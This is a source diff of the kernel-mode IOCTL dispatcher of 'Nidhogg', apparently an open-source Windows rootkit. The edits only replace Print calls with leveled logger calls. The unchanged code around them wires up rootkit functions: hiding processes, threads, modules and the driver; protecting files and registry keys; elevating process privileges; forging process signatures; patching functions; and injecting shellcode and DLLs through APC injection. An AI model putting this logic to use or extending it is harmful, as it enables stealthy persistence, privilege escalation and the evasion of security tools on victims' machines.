@@ -30,7 +30,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_PROTECT_UNPROTECT_PROCESS:
 	{
 		if (!Features.ProcessProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -47,19 +47,19 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 		if (data->Protect) {
 			if (!NidhoggProcessHandler->ProtectProcess(data->Pid)) {
-				Print(DRIVER_PREFIX "Failed to protect process with pid %d.\n", data->Pid);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to protect process with pid %d.\n", data->Pid);
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			Print(DRIVER_PREFIX "Protected process with pid %d.\n", data->Pid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Protected process with pid %d.\n", data->Pid);
 		}
 		else {
 			if (!NidhoggProcessHandler->RemoveProcess(data->Pid, ProcessType::Protected)) {
-				Print(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
+				NidhoggLogger.Warning(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
 				status = STATUS_NOT_FOUND;
 				break;
 			}
-			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
 		}
 		len += inputSize;
 		break;
@@ -68,7 +68,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_CLEAR_PROCESSES:
 	{
 		if (!Features.ProcessProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -84,7 +84,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			case ProcessType::Hidden:
 			case ProcessType::All: {
 				NidhoggProcessHandler->ClearProcessList(*data);
-				Print(DRIVER_PREFIX "Cleared process list of type %d.\n", *data);
+				NidhoggLogger.Info(DRIVER_PREFIX "Cleared process list of type %d.\n", *data);
 				break;
 			}
 			default: {
@@ -112,19 +112,19 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggProcessHandler->HideProcess(data->Pid);
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to hide process with pid %d: (0x%08X).\n", data->Pid, status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to hide process with pid %d: (0x%08X).\n", data->Pid, status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Hid process with pid %d.\n", data->Pid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Hid process with pid %d.\n", data->Pid);
 		}
 		else {
 			status = NidhoggProcessHandler->UnhideProcess(data->Pid);
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
 		}
 
 		len += inputSize;
@@ -146,10 +146,10 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = NidhoggProcessHandler->ElevateProcess(*data);
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to elevate process with pid %d: (0x%08X).\n", *data, status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to elevate process with pid %d: (0x%08X).\n", *data, status);
 			break;
 		}
-		Print(DRIVER_PREFIX "Elevated process with pid %d.\n", *data);
+		NidhoggLogger.Info(DRIVER_PREFIX "Elevated process with pid %d.\n", *data);
 
 		len += inputSize;
 		break;
@@ -172,10 +172,10 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = NidhoggProcessHandler->SetProcessSignature(data);
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to set new signature to process with pid %d: (0x%08X).\n", data->Pid, status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to set new signature to process with pid %d: (0x%08X).\n", data->Pid, status);
 			break;
 		}
-		Print(DRIVER_PREFIX "New signature applied to %d.\n", data->Pid);
+		NidhoggLogger.Info(DRIVER_PREFIX "New signature applied to %d.\n", data->Pid);
 		len += inputSize;
 		break;
 	}
@@ -191,7 +191,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		switch (data->Type) {
 			case ProcessType::Protected: {
 				if (!Features.ProcessProtection) {
-					Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
+					NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
 					status = STATUS_UNSUCCESSFUL;
 					break;
 				}
@@ -208,7 +208,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			}
 		}
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to list processes of type %d: (0x%08X).\n", data->Type, status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list processes of type %d: (0x%08X).\n", data->Type, status);
 			break;
 		}
 
@@ -219,7 +219,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_PROTECT_UNPROTECT_THREAD:
 	{
 		if (!Features.ThreadProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -239,20 +239,20 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggThreadHandler->ProtectThread(data->Tid) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to protect thread with tid %d: (0x%08X)\n", data->Tid, status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to protect thread with tid %d: (0x%08X)\n", data->Tid, status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Protecting thread with tid %d\n", data->Tid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Protecting thread with tid %d\n", data->Tid);
 		}
 		else {
 			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
 				STATUS_SUCCESS : STATUS_NOT_FOUND;
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
 		}
 
 		len += inputSize;
@@ -276,19 +276,19 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggThreadHandler->HideThread(data->Tid);
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to hide thread with tid %d: (0x%08X)\n", data->Tid, status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to hide thread with tid %d: (0x%08X)\n", data->Tid, status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Hiding thread with tid %d\n", data->Tid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Hiding thread with tid %d\n", data->Tid);
 		}
 		else {
 			status = NidhoggThreadHandler->UnhideThread(data->Tid);
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
 		}
 
 		len += inputSize;
@@ -298,7 +298,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_CLEAR_THREADS:
 	{
 		if (!Features.ThreadProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -335,7 +335,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		switch (data->Type) {
 		case ThreadType::Protected: {
 			if (!Features.ThreadProtection) {
-				Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
+				NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -353,7 +353,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to list threads of type %d: (0x%08X).\n", data->Type, status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list threads of type %d: (0x%08X).\n", data->Type, status);
 			break;
 		}
 
@@ -364,13 +364,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_PROTECT_UNPROTECT_FILE:
 	{
 		if (!Features.FileProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 		
 		if (inputSize != sizeof(IoctlFileItem)) {
-			Print(DRIVER_PREFIX "Invalid buffer type.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -378,7 +378,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		SIZE_T filePathLen = wcslen(data->FilePath);
 
 		if (filePathLen > MAX_PATH) {
-			Print(DRIVER_PREFIX "File path is too long.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "File path is too long.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -391,18 +391,18 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 		if (data->Protect) {
 			if (!NidhoggFileHandler->ProtectFile(filePath.Get())) {
-				Print(DRIVER_PREFIX "Failed to add file.\n");
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to add file.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			Print(DRIVER_PREFIX "Protected file %ws.\n", filePath.Get());
+			NidhoggLogger.Info(DRIVER_PREFIX "Protected file %ws.\n", filePath.Get());
 		}
 		else {
 			if (!NidhoggFileHandler->RemoveFile(filePath.Get(), FileType::Protected)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
-			Print(DRIVER_PREFIX "Unprotected file %ws.\n", filePath.Get());
+			NidhoggLogger.Info(DRIVER_PREFIX "Unprotected file %ws.\n", filePath.Get());
 		}
 
 		len += inputSize;
@@ -412,7 +412,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_CLEAR_PROTECTED_FILES:
 	{
 		if (!Features.FileProtection) {
-			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -449,7 +449,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		switch (data->Type) {
 		case FileType::Protected: {
 			if (!Features.FileProtection) {
-				Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
+				NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -463,7 +463,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to list files of type %d: (0x%08X).\n", data->Type, status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list files of type %d: (0x%08X).\n", data->Type, status);
 			break;
 		}
 
@@ -476,13 +476,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		IoctlRegItem regItem{};
 
 		if (!Features.RegistryFeatures) {
-			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
 		if (inputSize != sizeof(IoctlRegItem)) {
-			Print(DRIVER_PREFIX "Invalid buffer type.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -491,14 +491,14 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		SIZE_T keyLen = wcslen(data->KeyPath);
 
 		if (!NidhoggRegistryHandler->IsValidKey(data->KeyPath)) {
-			Print(DRIVER_PREFIX "Key is invalid.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Key is invalid.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);
 
 		if (err != 0) {
-			Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to copy to buffer.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -507,24 +507,24 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			SIZE_T valueLen = wcslen(data->ValueName);
 
 			if (!NidhoggRegistryHandler->IsValidValue(data->ValueName)) {
-				Print(DRIVER_PREFIX "Value is invalid.\n");
+				NidhoggLogger.Warning(DRIVER_PREFIX "Value is invalid.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
 			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);
 
 			if (err != 0) {
-				Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to copy to buffer.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
 		}
 		if (!NidhoggRegistryHandler->AddRegItem(regItem)) {
-			Print(DRIVER_PREFIX "Failed to add registry item\n");
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to add registry item\n");
 			status = STATUS_ALREADY_REGISTERED;
 			break;
 		}
-		Print(DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type);
+		NidhoggLogger.Info(DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type);
 
 		len += inputSize;
 		break;
@@ -535,13 +535,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		IoctlRegItem regItem{};
 
 		if (!Features.RegistryFeatures) {
-			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
 		if (inputSize != sizeof(IoctlRegItem)) {
-			Print(DRIVER_PREFIX "Invalid buffer type.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -550,14 +550,14 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		SIZE_T keyLen = wcslen(data->KeyPath);
 
 		if (!NidhoggRegistryHandler->IsValidKey(data->KeyPath)) {
-			Print(DRIVER_PREFIX "Key is invalid.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Key is invalid.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);
 
 		if (err != 0) {
-			Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to copy to buffer.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -566,24 +566,24 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			SIZE_T valueLen = wcslen(data->ValueName);
 
 			if (!NidhoggRegistryHandler->IsValidValue(data->ValueName)) {
-				Print(DRIVER_PREFIX "Value is invalid.\n");
+				NidhoggLogger.Warning(DRIVER_PREFIX "Value is invalid.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
 			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);
 
 			if (err != 0) {
-				Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to copy to buffer.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
 		}
 		if (!NidhoggRegistryHandler->RemoveRegItem(regItem)) {
-			Print(DRIVER_PREFIX "Failed to remove registry item\n");
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to remove registry item\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		Print(DRIVER_PREFIX "Removed registry item of type %d.\n", regItem.Type);
+		NidhoggLogger.Info(DRIVER_PREFIX "Removed registry item of type %d.\n", regItem.Type);
 
 		len += inputSize;
 		break;
@@ -592,7 +592,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_CLEAR_REGITEMS:
 	{
 		if (!Features.RegistryFeatures) {
-			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -623,7 +623,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_LIST_REGITEMS:
 	{
 		if (!Features.RegistryFeatures) {
-			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -644,13 +644,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		IoctlPatchedModule patchedModule{};
 
 		if (!Features.FunctionPatching) {
-			Print(DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 		
 		if (inputSize != sizeof(IoctlPatchedModule)) {
-			Print(DRIVER_PREFIX "Invalid buffer type.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -682,18 +682,18 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		patchedModule.Patch = patch.Get();
 
 		if (!IsValidPid(data->Pid)) {
-			Print(DRIVER_PREFIX "Invalid PID.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid PID.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 		status = NidhoggMemoryHandler->PatchModule(patchedModule);
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to patch module %ws and function %s for process %d: (0x%08X).\n", 
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to patch module %ws and function %s for process %d: (0x%08X).\n",
 				patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid, status);
 			break;
 		}
-		Print(DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid);
+		NidhoggLogger.Info(DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid);
 		len += inputSize;
 		break;
 	}
@@ -703,13 +703,13 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		IoctlHiddenModuleInfo hiddenModule{};
 
 		if (!Features.ModuleHiding) {
-			Print(DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
 		if (inputSize != sizeof(IoctlHiddenModuleInfo)) {
-			Print(DRIVER_PREFIX "Invalid buffer type.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -726,7 +726,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		hiddenModule.ModuleName = moduleName.Get();
 
 		if (!IsValidPid(hiddenModule.Pid)) {
-			Print(DRIVER_PREFIX "Buffer is invalid.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Buffer is invalid.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
@@ -735,17 +735,17 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 		if (!NT_SUCCESS(status)) {
 			if (hiddenModule.Hide)
-				Print(DRIVER_PREFIX "Failed to hide module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName, 
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to hide module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName,
 					hiddenModule.Pid, status);
 			else
-				Print(DRIVER_PREFIX "Failed to restore module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName, 
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to restore module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName,
 					hiddenModule.Pid, status);
 			break;
 		}
 		if (hiddenModule.Hide)
-			Print(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
 		else
-			Print(DRIVER_PREFIX "Restored module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
+			NidhoggLogger.Info(DRIVER_PREFIX "Restored module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
 
 		len += inputSize;
 		break;
@@ -754,7 +754,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_HIDE_UNHIDE_DRIVER:
 	{
 		if (inputSize != sizeof(IoctlHiddenDriverInfo)) {
-			Print(DRIVER_PREFIX "Invalid buffer type.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -765,7 +765,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = driverName.CopyData(data->DriverName, driverNameSize);
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Buffer is invalid.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Buffer is invalid.\n");
 			break;
 		}
 
@@ -773,19 +773,19 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggMemoryHandler->HideDriver(driverName.Get());
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName.Get(), status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName.Get(), status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName.Get());
+			NidhoggLogger.Info(DRIVER_PREFIX "Hid driver %ws.\n", driverName.Get());
 		}
 		else {
 			status = NidhoggMemoryHandler->UnhideDriver(driverName.Get());
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName.Get(), status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName.Get(), status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName.Get());
+			NidhoggLogger.Info(DRIVER_PREFIX "Restored driver %ws.\n", driverName.Get());
 		}
 
 		len += inputSize;
@@ -855,7 +855,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		switch (shellcodeInfo.Type) {
 		case InjectionType::APCInjection: {
 			if (!Features.ApcInjection) {
-				Print(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
+				NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -873,11 +873,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status);
 			break;
 		}
 
-		Print(DRIVER_PREFIX "Shellcode injected successfully.\n");
+		NidhoggLogger.Info(DRIVER_PREFIX "Shellcode injected successfully.\n");
 		len += inputSize;
 		break;
 	}
@@ -914,7 +914,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		switch (dllInfo.Type) {
 		case InjectionType::APCInjection: {
 			if (!Features.ApcInjection) {
-				Print(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
+				NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -932,11 +932,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status);
 			break;
 		}
 
-		Print(DRIVER_PREFIX "DLL injected successfully.\n");
+		NidhoggLogger.Info(DRIVER_PREFIX "DLL injected successfully.\n");
 		len += inputSize;
 		break;
 	}
@@ -965,7 +965,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to list object callbacks (0x%08X).\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list object callbacks (0x%08X).\n", status);
 			break;
 		}
 
@@ -995,7 +995,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to list ps routines (0x%08X).\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list ps routines (0x%08X).\n", status);
 			break;
 		}
 
